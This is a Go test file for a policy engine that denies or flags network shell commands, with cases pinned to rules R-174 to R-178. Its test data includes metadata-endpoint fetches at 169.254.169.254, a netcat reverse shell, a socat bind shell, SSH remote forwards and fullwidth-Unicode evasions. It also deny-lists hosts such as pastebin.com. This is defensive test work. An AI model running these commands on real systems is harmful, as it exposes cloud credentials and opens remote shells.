package policy

import "testing"

// netEval evaluates cmd under the POSIX dialect, or PowerShell when ps is set.
func netEval(eng *Engine, cmd string, ps bool) Verdict {
	ev := netEvent(cmd)
	if ps {
		ev.Dialect = DialectPowerShell
	}
	return eng.Evaluate(ev)
}

type netCase struct {
	name string
	cmd  string
	ps   bool
}

// wantRule runs every case through eng and requires rule/decision.
func wantRule(t *testing.T, eng *Engine, rule string, dec Decision, cases []netCase) {
	t.Helper()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if v := netEval(eng, tc.cmd, tc.ps); v.RuleID != rule || v.Decision != dec {
				t.Errorf("%q = %s/%s (%s), want %s/%s", tc.cmd, v.Decision, v.RuleID, v.Reason, dec, rule)
			}
		})
	}
}

// wantNotRule requires that no case hits rule.
func wantNotRule(t *testing.T, eng *Engine, rule string, cases []netCase) {
	t.Helper()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if v := netEval(eng, tc.cmd, tc.ps); v.RuleID == rule {
				t.Errorf("%q wrongly hit %s (%s)", tc.cmd, rule, v.Reason)
			}
		})
	}
}

// TestNet1_SchemelessURLs pins NET-1: a scheme-less positional / --url / -Uri
// operand is a host (curl and wget assume http).
func TestNet1_SchemelessURLs(t *testing.T) {
	t.Parallel()
	enf := netEngine(t, ModeEnforce, nil, nil)
	wantRule(t, enf, "R-174", DecisionDeny, []netCase{
		{"curl bare", "curl 169.254.169.254/latest/", false},
		{"wget bare", "wget 169.254.169.254/latest/", false},
		{"curl flags first", "curl -sSL -H 'X-A: b' -o /tmp/o 169.254.169.254/latest/", false},
		{"curl attached value", "curl -XPOST -d@f 169.254.169.254", false},
		{"curl --url", "curl --url 169.254.169.254/x", false},
		{"curl --url=", "curl --url=169.254.169.254/x", false},
		{"curl port", "curl 169.254.169.254:80/x", false},
		{"curl userinfo", "curl user:pw@169.254.169.254/x", false},
		{"curl decimal", "curl 2852039166/", false},
		{"curl metadata name", "curl metadata.google.internal/computeMetadata/v1/", false},
		{"curl ipv6 bracket", "curl [fd00:ec2::254]/latest/", false},
		{"wget -qO-", "wget -qO- 169.254.169.254/latest/", false},
		{"wget -O file", "wget -O out 169.254.169.254", false},
		{"iwr bare", "iwr 169.254.169.254/latest", true},
		{"irm bare", "irm 169.254.169.254/latest", true},
		{"Invoke-WebRequest -Uri", "Invoke-WebRequest -Uri 169.254.169.254/latest", true},
		{"Invoke-WebRequest -Uri:", "Invoke-WebRequest -Uri:169.254.169.254/latest", true},
		{"Invoke-WebRequest -UseBasicParsing first", "Invoke-WebRequest -UseBasicParsing -Method Get 169.254.169.254", true},
		{"Invoke-RestMethod positional", "Invoke-RestMethod 169.254.169.254/x", true},
		{"Test-NetConnection positional", "Test-NetConnection 169.254.169.254 -Port 80", true},
		{"Test-NetConnection -ComputerName", "Test-NetConnection -ComputerName 169.254.169.254 -Port 80", true},
		{"tnc", "tnc 169.254.169.254 -Port 80", true},
	})
	wantNotRule(t, enf, "R-174", []netCase{
		{"header value is not host", "curl -H 'X-Foo: 169.254.169.254' https://example.com", false},
		{"data value is not host", "curl -d 169.254.169.254 https://example.com", false},
		{"output file", "curl -o 169.254.169.254.txt https://example.com", false},
		{"wget header", "wget --header 'X: 169.254.169.254' https://example.com", false},
		{"iwr body", "Invoke-WebRequest -Body 169.254.169.254 -Uri https://example.com", true},
		{"public bare", "curl example.com/x", false},
	})

	t.Run("deny_hosts", func(t *testing.T) {
		t.Parallel()
		e := netEngine(t, ModeEnforce, nil, []string{"evil.example.com", "203.0.113.0/24"})
		wantRule(t, e, "R-174", DecisionDeny, []netCase{
			{"curl bare name", "curl evil.example.com/x", false},
			{"wget sub", "wget api.evil.example.com", false},
			{"curl cidr", "curl 203.0.113.9/x", false},
			{"iwr", "iwr evil.example.com", true},
		})
	})
	t.Run("R-175 private", func(t *testing.T) {
		t.Parallel()
		e := netEngine(t, ModeEnforce, nil, nil, Override{RuleID: "R-175", Decision: &netAsk, Source: "user"})
		wantRule(t, e, "R-175", DecisionAsk, []netCase{
			{"curl", "curl 10.0.0.5/admin", false},
			{"wget", "wget 192.168.1.1", false},
			{"curl raw public", "curl 203.0.113.5/", false},
		})
	})
	t.Run("R-176 allow list", func(t *testing.T) {
		t.Parallel()
		e := netEngine(t, ModeEnforce, []string{"example.com"}, nil, Override{RuleID: "R-176", Decision: &netAsk, Source: "user"})
		wantRule(t, e, "R-176", DecisionAsk, []netCase{
			{"curl", "curl other.example.org/x", false},
			{"wget", "wget other.example.org", false},
			{"iwr", "iwr other.example.org", true},
		})
		wantNotRule(t, e, "R-176", []netCase{
			{"allowed", "curl example.com/x", false},
			{"header value", "curl -H 'A: other.example.org' example.com", false},
		})
	})
}

// TestNet2_UnbracketedIPv6 pins NET-2.
func TestNet2_UnbracketedIPv6(t *testing.T) {
	t.Parallel()
	enf := netEngine(t, ModeEnforce, nil, nil)
	wantRule(t, enf, "R-174", DecisionDeny, []netCase{
		{"nc", "nc fd00:ec2::254 80", false},
		{"nc flags", "nc -w 3 fd00:ec2::254 80", false},
		{"telnet", "telnet fd00:ec2::254 80", false},
		{"ping", "ping -c1 fd00:ec2::254", false},
		{"ping6", "ping6 fd00:ec2::254", false},
		{"nc bracketed", "nc [fd00:ec2::254] 80", false},
	})
}

// TestNet3_SocatIPv6 pins NET-3.
func TestNet3_SocatIPv6(t *testing.T) {
	t.Parallel()
	enf := netEngine(t, ModeEnforce, nil, nil)
	wantRule(t, enf, "R-174", DecisionDeny, []netCase{
		{"tcp6 bracket", "socat - TCP6:[fd00:ec2::254]:80", false},
		{"tcp bracket", "socat - TCP:[fd00:ec2::254]:80", false},
		{"options", "socat - TCP:169.254.169.254:80,connect-timeout=2", false},
		{"no port", "socat - TCP:169.254.169.254", false},
		{"socks target", "socat - SOCKS4:proxy.example.com:169.254.169.254:80", false},
	})
}

// TestNet4_SSHRemoteForward pins NET-4.
func TestNet4_SSHRemoteForward(t *testing.T) {
	t.Parallel()
	enf := netEngine(t, ModeEnforce, nil, nil)
	wantRule(t, enf, "R-178", DecisionAsk, []netCase{
		{"-R plain", "ssh -R 9000:localhost:22 user@host", false},
		{"-R attached", "ssh -R9000:localhost:22 user@host", false},
		{"-NR cluster", "ssh -NR 9000:localhost:22 user@host", false},
		{"-NR attached", "ssh -NR9000:localhost:22 user@host", false},
		{"-fNR", "ssh -fNR 9000:localhost:22 user@host", false},
		{"after host", "ssh user@host -R 9000:localhost:22", false},
		{"-o RemoteForward", "ssh -o RemoteForward=9000:localhost:22 user@host", false},
		{"-oRemoteForward", "ssh -oRemoteForward=9000:localhost:22 user@host", false},
	})
	wantNotRule(t, enf, "R-178", []netCase{
		{"plain ssh", "ssh user@host uptime", false},
		{"-L only", "ssh -L 8080:localhost:80 user@host", false},
		{"remote command -R", "ssh user@host grep -R foo .", false},
		{"R inside -o value", "ssh -o ProxyCommand=R user@host", false},
	})
}

// TestNet5_Busybox pins NET-5.
func TestNet5_Busybox(t *testing.T) {
	t.Parallel()
	enf := netEngine(t, ModeEnforce, nil, nil)
	wantRule(t, enf, "R-174", DecisionDeny, []netCase{
		{"busybox wget", "busybox wget http://169.254.169.254/", false},
		{"busybox wget bare", "busybox wget -qO- 169.254.169.254/latest", false},
		{"busybox nc", "busybox nc 169.254.169.254 80", false},
		{"toybox wget", "toybox wget http://169.254.169.254/", false},
		{"path busybox", "/bin/busybox wget http://169.254.169.254/", false},
	})
	wantRule(t, enf, "R-177", DecisionAsk, []netCase{
		{"busybox nc -l", "busybox nc -l -p 4444", false},
	})
	wantRule(t, enf, "R-177", DecisionDeny, []netCase{
		{"busybox nc -e", "busybox nc 203.0.113.5 4444 -e /bin/sh", false},
	})
	wantNotRule(t, enf, "R-174", []netCase{
		{"busybox ls", "busybox ls /", false},
	})
}

// TestNet6_SocatListenAbbreviations pins NET-6.
func TestNet6_SocatListenAbbreviations(t *testing.T) {
	t.Parallel()
	enf := netEngine(t, ModeEnforce, nil, nil)
	wantRule(t, enf, "R-177", DecisionAsk, []netCase{
		{"tcp-listen", "socat TCP-LISTEN:8080,fork -", false},
		{"tcp-l", "socat TCP-L:8080,fork -", false},
		{"tcp4-l", "socat TCP4-L:8080 -", false},
		{"tcp6-l", "socat tcp6-l:8080 -", false},
		{"udp-l", "socat UDP-L:5353 -", false},
		{"openssl-l", "socat OPENSSL-L:8443,fork -", false},
		{"udp-recvfrom", "socat UDP-RECVFROM:5353 -", false},
		{"unix-l", "socat UNIX-L:/tmp/s -", false},
	})
	wantRule(t, enf, "R-177", DecisionDeny, []netCase{
		{"bind shell abbreviated", "socat TCP-L:4444,fork EXEC:/bin/sh", false},
	})
	wantNotRule(t, enf, "R-177", []netCase{
		{"connect", "socat - TCP:example.com:80", false},
	})
}

// TestNet7_CurlResolveConnectTo pins NET-7.
func TestNet7_CurlResolveConnectTo(t *testing.T) {
	t.Parallel()
	enf := netEngine(t, ModeEnforce, nil, nil)
	wantRule(t, enf, "R-174", DecisionDeny, []netCase{
		{"resolve", "curl --resolve x.test:80:169.254.169.254 http://x.test/", false},
		{"resolve=", "curl --resolve=x.test:80:169.254.169.254 http://x.test/", false},
		{"resolve plus", "curl --resolve +x.test:80:169.254.169.254 http://x.test/", false},
		{"resolve list", "curl --resolve x.test:80:203.0.113.5,169.254.169.254 http://x.test/", false},
		{"resolve ipv6", "curl --resolve x.test:80:[fd00:ec2::254] http://x.test/", false},
		{"connect-to", "curl --connect-to x.test:80:169.254.169.254:80 http://x.test/", false},
		{"connect-to ipv6", "curl --connect-to x.test:80:[fd00:ec2::254]:80 http://x.test/", false},
		{"proxy bare", "curl -x 169.254.169.254:3128 https://example.com", false},
	})
	wantNotRule(t, enf, "R-174", []netCase{
		{"resolve public", "curl --resolve x.test:80:203.0.113.5 http://x.test/", false},
		{"connect-to same host", "curl --connect-to ::example.com: http://x.test/", false},
	})
}

// TestNet8_UnicodeNormalisation pins NET-8.
func TestNet8_UnicodeNormalisation(t *testing.T) {
	t.Parallel()
	enf := netEngine(t, ModeEnforce, nil, []string{"evil.example.com", "ｆｏｏ.example.org"})
	wantRule(t, enf, "R-174", DecisionDeny, []netCase{
		{"fullwidth ip url", "curl http://１６９.２５４.１６９.２５４/", false},
		{"fullwidth ip bare", "curl １６９.２５４.１６９.２５４/", false},
		{"ideographic dots", "curl http://169。254。169。254/", false},
		{"fullwidth deny host", "curl http://ｅｖｉｌ.example.com/", false},
		{"fullwidth pattern", "curl http://foo.example.org/", false},
		{"fullwidth nc", "nc １６９.２５４.１６９.２５４ 80", false},
	})
}

// TestCFG5_HostPatternRobustness pins the network half of CFG-5.
func TestCFG5_HostPatternRobustness(t *testing.T) {
	t.Parallel()
	for _, pat := range []string{"pastebin.com.", "pastebin.com:443", "*pastebin.com", "*.pastebin.com.", "PASTEBIN.com", " pastebin.com ", "https://pastebin.com", "pastebin.com/x"} {
		enf := netEngine(t, ModeEnforce, nil, []string{pat})
		if pat == "*.pastebin.com." {
			if v := netEval(enf, "curl https://api.pastebin.com/x", false); v.RuleID != "R-174" {
				t.Errorf("pattern %q missed subdomain: %s/%s", pat, v.Decision, v.RuleID)
			}
			continue
		}
		for _, cmd := range []string{"curl https://pastebin.com/raw/x", "curl https://pastebin.com./raw/x", "curl https://www.pastebin.com/raw/x"} {
			if v := netEval(enf, cmd, false); v.RuleID != "R-174" {
				t.Errorf("pattern %q did not deny %q: %s/%s", pat, cmd, v.Decision, v.RuleID)
			}
		}
		if v := netEval(enf, "curl https://example.com/", false); v.RuleID == "R-174" {
			t.Errorf("pattern %q denied an unrelated host", pat)
		}
	}
}
